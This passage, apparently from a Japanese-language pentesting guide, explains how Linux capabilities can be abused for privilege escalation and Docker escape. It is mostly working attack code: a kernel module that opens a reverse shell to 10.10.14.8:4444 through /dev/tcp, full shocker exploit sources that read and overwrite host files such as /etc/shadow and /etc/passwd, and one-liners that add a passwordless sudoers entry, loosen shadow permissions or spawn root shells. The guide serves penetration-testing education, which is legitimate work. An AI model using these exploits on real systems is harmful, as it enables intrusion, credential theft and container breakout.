#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile の各 make word の前にある空白文字は、スペースではなく**タブでなければなりません**！

コンパイルするには `make` を実行します。
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、shell 内で `nc` を起動し、別の shell から **module を load** すると、`nc` process 内で shell を capture できます。
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing SYS_MODULE Capability」laboratory からコピーされました。**<sup>[[1]](#references)</sup>

この technique の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) により、process は**file の読み取り、および directory の読み取りと実行に関する permission を bypass**できます。また、mount file descriptor を基準に、同じ mounted filesystem 上の有効な file handle を解釈する `open_by_handle_at(2)` も許可します。ただし、process の mount namespace 外にあるすべての file が自動的に公開されるわけではありません。File-handle breakout にはさらに、host に関連する filesystem reference、valid または discoverable な handle、互換性のある filesystem と storage layout、および runtime や LSM による block がないことが必要です。過去の Docker「Shocker」technique は、影響を受ける layout でこのような組み合わせを実証しました。詳細な分析は[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)にあります。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**これは、file の read permission check と directory の read/execute permission check を bypass できることを意味します**。<sup>[[14]](#references)</sup>

**binary を使用した例**

binary は、その namespace からアクセス可能な file を読み取れます。したがって、`tar` のような file にこの capability がある場合、shadow file を読み取ることができます。
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Example with binary2**

この場合、**`python`** binary にこの capability があるとします。root files を一覧表示するには、次のように実行できます:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
また、ファイルを読み取るには、次のようにします:
```python
print(open("/etc/shadow", "r").read())
```
**環境内の例 (Docker breakout)**

Docker container 内で有効な capabilities は、`capsh --print` を使用して確認できます。<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**DAC_READ_SEARCH** capability が有効になっていることが確認できます。これは DAC の read/search checks を bypass し、`open_by_handle_at(2)` を許可します。ただし、それ自体は process-debugging capability ではありません。<sup>[[14]](#references)</sup>

次の exploit の仕組みは [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で確認できますが、簡単に説明すると、**CAP_DAC_READ_SEARCH** により permission checks なしで file system を traverse でき、`open_by_handle_at(2)` が許可されます。これにより、関連する namespaces と mounts に到達可能な場合、他の processes が開いている files が露出する可能性があります。<sup>[[13]](#references)[[14]](#references)</sup>

これらの permissions を悪用して host から files を読み取る元の exploit は、こちらにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、読み取る file を最初の argument として渡し、結果を file に dump できる **modified version** です。<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> exploit は、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル `/.dockerinit` を使用していましたが、この modified version では `/etc/hostname` を使用します。exploit が動作しない場合は、別のファイルを設定する必要があるかもしれません。host に mount されているファイルを見つけるには、`mount` command を実行します。

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit は、host 上に mount された何かへの pointer を見つける必要があります。元の exploit ではファイル /.dockerinit を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)

**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「Abusing DAC_READ_SEARCH Capability」laboratory からコピーされました。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**この capability は、ファイルの read および write permission check と、ほとんどの execute check を bypass します**。ただし、regular file の execute には、少なくとも 1 つの execute bit が設定されている必要があります。read-only mount、immutable state、または LSM denial は override しません。<sup>[[14]](#references)</sup>

privileged group の membership によって readable または writable になるファイルを探します。有用な target は、target の ownership と mode bits によって異なります。<sup>[[14]](#references)</sup>

**binary の例**

この例では vim にこの capability があるため、`_passwd_`、`_sudoers_`、または `_shadow_` などの任意のファイルを modify できます。
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**binary 2 の例**

この例では、**`python`** binary にこの capability が付与されています。python を使用して、任意の file を上書きできます:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境 + CAP_DAC_READ_SEARCH の例（Docker breakout）**

前述の `CAP_DAC_READ_SEARCH` environment example で示したように、`capsh --print` を使用して `CAP_DAC_OVERRIDE` を確認します。<sup>[[14]](#references)[[26]](#references)</sup>

まず、host の **任意のファイルを読み取るために DAC_READ_SEARCH capability を悪用する** [**前のセクション**](linux-capabilities.md#cap_dac_read_search) を読み、exploit を **compile** します。\
次に、host の filesystem 内に **任意のファイルを書き込める** **shocker exploit の以下のバージョンを compile** します:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker containerから**脱出する**には、ホストからファイル`/etc/shadow`と`/etc/passwd`を**ダウンロード**し、それらに**新しいユーザーを追加**して、**`shocker_write`**を使用して上書きできます。その後、**ssh**経由で**アクセス**します。

**この technique のコードは、** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **の「Abusing DAC_OVERRIDE Capability」labからコピーしたものです。**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**この capability により、processはファイルのownerを変更できます。**<sup>[[14]](#references)</sup>

**binaryを使った例**

**`python`** binaryにこの capabilityがあると仮定します。ファイル（`shadow`など）のownerを変更し、その後、他のpermissionが許可していれば、そのaccessを利用してファイルをmodifyできます。
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、**`ruby`** バイナリがこの capability を持っている場合:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**この capability は、権限の変更を含む多くのファイル操作で所有権チェックを回避します**。<sup>[[14]](#references)</sup>

**バイナリを使用した例**

Python にこの capability がある場合、shadow ファイルの権限を変更し、**root パスワードを変更**して、権限を昇格できます：
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**この capability により、プロセスは、kernel によって適用される credential および capability のルールに従って、有効ユーザー ID を変更できます**。<sup>[[14]](#references)</sup>

**binary の例**

python にこの **capability** がある場合、これを非常に簡単に悪用して root へ privilege escalation できます：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**この capability により、kernel が適用する credential および capability のルールに従い、process は実効 group ID を変更できます**。<sup>[[14]](#references)</sup>

**privilege を escalate するために overwrite できるファイルは多数あります。**[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**binary の例**

この場合、任意の group になりすませるため、group が read できる interesting なファイルを探します。
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
権限昇格に悪用できるファイル（読み取りまたは書き込みによって）を見つけたら、次のコマンドで **対象のグループになりすました shell を取得できます**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、group shadowになりすましたため、ファイル`/etc/shadow`を読み取れます。
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

両方の capability が同じ helper で利用可能な場合、実用的な chain は次のとおりです。

1. EGID を `shadow`（または別の特権グループ）に切り替える。
2. `/etc/shadow` に対して `chown` を使用し、グループを `shadow` のまま UID を自分の UID に設定する。
3. 対象の hash を読み取り、crack/pivot する。
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
これは直接完全な root 権限を必要とせず、credential reuse を介した pivot に十分なことが一般的です。

**docker** がインストールされている場合、**docker group** に **impersonate** して、[**docker socket** と通信して privileges を escalate](#writable-docker-socket) するために悪用できます。

## CAP_SETFCAP

**この capability により、プロセスは file capabilities を設定できます**。<sup>[[14]](#references)</sup>

**binary を使った例**

python にこの **capability** がある場合、非常に簡単に悪用して privileges を root に escalate できます:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 新しく書き込まれた capability set は以前のセットを置き換えます。その後、helper が新しい capabilities のみで実行されると、別のファイルを更新するための `CAP_SETFCAP` が保持されなくなる可能性があります。<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで privileges を escalate する方法を確認できます。

**環境を使用した例 (Docker breakout)**

Docker の文書化されたデフォルト capability set には **CAP_SETFCAP** が含まれていますが、実際のセットは runtime configuration によって異なります。<sup>[[19]](#references)</sup>
次のコマンドで process capabilities を確認できます:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この capability はファイル capability の書き込みを可能にしますが、それ自体では、現在のプロセスにそれらの capability を付与したり、ファイルの実行時に適用される file、bounding-set、namespace のルールを回避したりすることはできません。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
ファイルの許可された capabilities はプロセスの capability bounding set によって制限され、ファイルの effective bit は、ファイルの permitted set をプロセスの effective set に引き上げるかどうかを制御します。そのため、ファイルに capabilities を追加しても、要求されたすべての capability が実行時に自動的に使用可能になるわけではありません。<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` system call へのアクセス、各種ディスクコマンドなど、多数の機密性の高い操作を提供します。`FIBMAP ioctl(2)` もこの capability によって有効になり、[past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) に問題を引き起こしたことがあります。man page によると、これは holder が他のデバイス上でデバイス固有のさまざまな操作を実行することも可能にします。<sup>[[14]](#references)</sup>

これは **privilege escalation** や **Docker breakout** に利用できます。<sup>[[14]](#references)</sup>

この capability だけでは、有用な interface は公開されません。container breakout にはさらに、アクセス可能な host device または resource、device-cgroup と filesystem の permission、そして hardware および kernel に固有の technique が必要です。厳格な `/dev/mem`、kernel lockdown、virtualization、seccomp、LSM policy によって、一般的な経路が利用できなくなることがよくあります。まず capability と exposure を確認してください：
```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
`/dev/mem` が承認済みのインターフェースである場合、一時的な lab では、その lab の hardware map から選択した範囲を読み取り、ハッシュ化することで、境界を越えた node-memory disclosure を実証できます。
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Do not guess the range: MMIO リージョンの読み取りには副作用が発生する可能性があり、あるプラットフォームで有効なアドレスが、別のプラットフォームではハードウェアや kernel memory を制御する可能性があります。Kernel-memory modification や device control には、承認済みのプラットフォーム固有の proof が必要です。安全な汎用 raw-write の例はありません。

## CAP_KILL

**この capability は、kernel によって定義されたケースにおいて、process への signal 送信に関する permission checks を bypass します**。<sup>[[14]](#references)</sup>

**binary を使った例**

**`python`** binary にこの capability があるとします。さらに、**service または socket の設定**（あるいは service に関連する設定ファイル）を変更できる場合、それを backdoor 化し、その service に関連する process を kill して、新しい設定ファイルが backdoor とともに実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill による Privesc**

kill capabilities があり、**root として実行されている node program**（または別の user として実行されているもの）がある場合、**signal SIGUSR1** を送信して、**node debugger** を**open**させ、そこへ connect できる可能性があります。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**この capability により、1024 未満の Internet ポートに bind できます。** これによって、より広範な privilege escalation が直接許可されるわけではありません。<sup>[[14]](#references)</sup>

**バイナリの例**

**`python`** にこの capability がある場合、任意のポートで listen でき、そこから他の任意のポートへ接続することもできます（サービスによっては、特定の privilege port からの接続を必要とします）。

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、process が **RAW および PACKET sockets を作成**できるようにし、任意の network packets を生成して送信できるようにします。これにより、packet spoofing、traffic injection、network access controls の bypass など、containerized environments における security risks につながる可能性があります。悪意のある攻撃者は、これを悪用して container の routing に干渉したり、host network security を侵害したりできます。特に、十分な firewall protections がない場合は危険です。さらに、**CAP_NET_RAW** は RAW ICMP requests による ping などの操作をサポートします。<sup>[[14]](#references)</sup>

**これにより、適切な socket interface を使用して packet capture が可能になります。** ただし、これによって broader privilege escalation が直接付与されるわけではありません。<sup>[[14]](#references)</sup>

**バイナリの例**

binary **`tcpdump`** にこの capability がある場合、これを使用して network information を capture できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
If **environment** がこの capability を付与している場合、**`tcpdump`** もこれを使用して traffic を sniff できます。<sup>[[14]](#references)</sup>

**binary 2を使用した例**

以下の例は、"**lo**"（**localhost**）interface の traffic を傍受するのに役立つ **`python2`** code です。この code は、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) の lab "_The Basics: CAP-NET_BIND + NET_RAW_" からのものです。<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、現在の network namespace における firewall settings、routing tables、socket permissions、network interface settings など、**network configurations を変更する**権限を holder に付与します。また、その namespace 内の interface で promiscuous mode を有効にすることもできます。これにより、その interface に到達した traffic が露出する可能性がありますが、それだけで他の network namespaces にある任意の interface を sniffing できるわけではありません。<sup>[[14]](#references)</sup>

これらの操作は、process の **current network namespace** に影響します。Host の network-state control には、`--network=host`、Kubernetes の `hostNetwork: true`、または別の namespace-entry primitive が必要です。`CAP_NET_RAW` だけでは generic host shell にはなりませんが、protocol-specific escape に関与した documented な例があります。過去の GCE chain では、root、host network namespace、`CAP_NET_ADMIN`、`CAP_NET_RAW`、plaintext metadata traffic、そして SSH key を inject する raceable guest-agent request が組み合わされました。完全な prerequisites と最新の HTTPS metadata に関する注意点については、[GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) を参照してください。

**binary の例**

**python binary** にこれらの capabilities があるとします。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**この capability は、immutable や append-only などの inode flags を変更できます。** より広範な privilege escalation を直接許可するものではありません。<sup>[[14]](#references)</sup>

**binary を使用した例**

ファイルが immutable で、python にこの capability がある場合、**immutable attribute を削除してファイルを変更可能にできます:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` および `FS_IOC_SETFLAGS` 操作は inode フラグを読み取り、更新します。`FS_IMMUTABLE_FL` は、この例でクリアされる immutable フラグです。<sup>[[27]](#references)</sup>

> [!TIP]
> 通常、この immutable 属性は次のコマンドで設定および削除します：
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` system call の実行を可能にします。これにより、既知の technique を使って、脆弱に構築された `chroot(2)` jail から escape できる場合があります。<sup>[[11]](#references)[[14]](#references)</sup>

